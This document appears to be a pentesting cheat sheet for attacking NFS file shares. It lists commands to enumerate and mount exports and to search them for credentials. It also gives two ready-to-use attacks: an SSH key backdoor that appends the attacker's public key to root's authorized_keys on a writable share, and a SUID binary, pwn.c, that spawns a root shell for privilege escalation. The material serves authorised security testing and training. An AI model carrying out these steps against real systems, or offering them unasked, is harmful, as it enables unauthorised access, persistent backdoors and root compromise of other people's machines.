# NFS Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating NFS (port 2049), I realistically expect to find:

- [ ] List of exported shares available for mounting
- [ ] Ability to mount shared directories locally
- [ ] Read access to sensitive files (configs, backups, credential dumps)
- [ ] Write access allowing backdoor installation (e.g., adding SSH keys)
- [ ] Insecure permissions enabling upload of SUID binaries for privilege escalation
- [ ] Misconfigured root_squash options allowing root access on target
- [ ] Information about network shares that expands the attack surface

---

## ‚úÖ NFS Pentest Checklist

- [ ] **Connect to the Target**
  - Make sure the port is open and accessible.

- [ ] **Scan Using Nmap**
    ```bash
    nmap -p 2049 --script=nfs* <IP>
    ```

- [ ] **Check Available Shares**
    ```bash
    showmount -e <IP>
    cat /etc/exports
    ```

- [ ] **Check If You Can Mount**
    ```bash
    mount -t nfs [-o vers=2] <IP>:<remote_folder> <local_folder> -o nolock
    umount <local_folder>
    ```

- [ ] **General Info About RPC / NFS**
    ```bash
    nfs-ls
    nfs-showmount
    nfs-statfs
    ```

- [ ] **Check for Passwords in Files on Mounted Drives**
  - Look for backups, configs, scripts containing credentials.

- [ ] **Mount and Upload SSH Keys for RCE**
    ```bash
    ssh-keygen
    mount -t nfs <IP>:/<DIR> /mnt/myroot
    cat .ssh/id_rsa.pub >> /mnt/myroot/root/.ssh/authorized_keys
    umount /mnt/myroot
    ```

---

## ‚úÖ NFS Useful Commands

- **Nmap Scripts**
    ```bash
    nmap -p 2049 --script=nfs* <IP>
    nfs-ls
    nfs-showmount
    nfs-statfs
    ```

- **Metasploit Scanner**
    ```bash
    use auxiliary/scanner/nfs/nfsmount
    ```

- **Checking Shares**
    ```bash
    showmount -e <IP>
    cat /etc/exports
    ```

- **Mounting Example**
    ```bash
    mkdir /mnt/myroot
    mount -t nfs [-o vers=2] <IP>:<remote_folder> /mnt/myroot -o nolock
    umount /mnt/myroot/
    ```

- **SSH Key Backdoor Setup**
    ```bash
    ssh-keygen
    mount -t nfs <IP>:/<DIR> /mnt/myroot
    cat .ssh/id_rsa.pub >> /mnt/myroot/root/.ssh/authorized_keys
    umount /mnt/myroot/
    ```

- **Example Exploit - Attacker Side**
    ```bash
    mkdir <DIRECTORY>
    mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
    cd <DIRECTORY>
    echo 'int main(void){setreuid(0,0); system("/bin/bash"); return 0;}' > pwn.c
    gcc pwn.c -o pwn
    chmod +s pwn
    ```

- **Example Exploit - Victim Side**
    ```bash
    cd <SHARE>
    ./pwn
    ```
